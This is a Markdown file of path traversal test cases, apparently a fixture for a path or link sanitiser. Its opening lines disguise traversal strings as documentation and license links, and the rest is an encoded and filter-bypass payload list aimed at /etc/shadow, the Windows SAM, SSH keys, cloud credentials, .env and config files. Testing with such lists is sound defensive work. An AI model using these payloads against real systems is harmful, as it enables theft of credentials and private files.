# Path Traversal Test Cases

## Documentation

Please refer to our documentation at: `../../../etc/passwd`

## File Includes

- Configuration: `../../../../etc/shadow`
- License: `..\\..\\..\\windows\\system32\\config\\sam`
- README: `....//....//....//etc//passwd`
- Guide: `..;/..;/..;/etc/passwd`
- Manual: `....\/....\/....\/etc/passwd`

## URL Encoded Variants

- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam`
- `..%252f..%252f..%252fetc%252fpasswd`
- `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`

## Double Encoding

- `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
- `%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255csystem32%255cconfig%255csam`

## Unicode/UTF-8 Encoding

- `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`
- `..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd`
- `..%u2216..%u2216..%u2216etc%u2216passwd`

## Null Byte Injection

- `../../../../etc/passwd%00.jpg`
- `..\..\..\..\windows\system32\config\sam%00.png`
- `../../../etc/passwd%00`

## Absolute Paths

- `/etc/passwd`
- `/etc/shadow`
- `C:\Windows\System32\config\SAM`
- `/var/www/html/index.php`
- `/proc/self/environ`
- `/proc/self/cmdline`
- `/proc/self/fd/0`

## Filter Bypasses

- `..././..././..././etc/passwd`
- `....\/....\/....\/etc/passwd`
- `....//....//....//etc//passwd`
- `..///////..////..//////etc/passwd`
- `/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd`

## Windows Specific

- `..\..\..\..\windows\win.ini`
- `..\..\..\..\boot.ini`
- `..\..\..\..\windows\system32\drivers\etc\hosts`
- `C:\inetpub\wwwroot\web.config`
- `\\?\C:\windows\system32\config\sam`

## Environment Files

- `../../../../.env`
- `../../../../.git/config`
- `../../../../.ssh/id_rsa`
- `../../../../.bash_history`
- `../../../../.aws/credentials`
- `../../../../.docker/config.json`

## Log Files

- `../../../../var/log/apache2/access.log`
- `../../../../var/log/nginx/error.log`
- `../../../../var/log/auth.log`
- `../../../../var/log/syslog`

## Application Files

- `../../../../application/config/database.yml`
- `../../../../config/database.yml`
- `../../../../wp-config.php`
- `../../../../sites/default/settings.php`

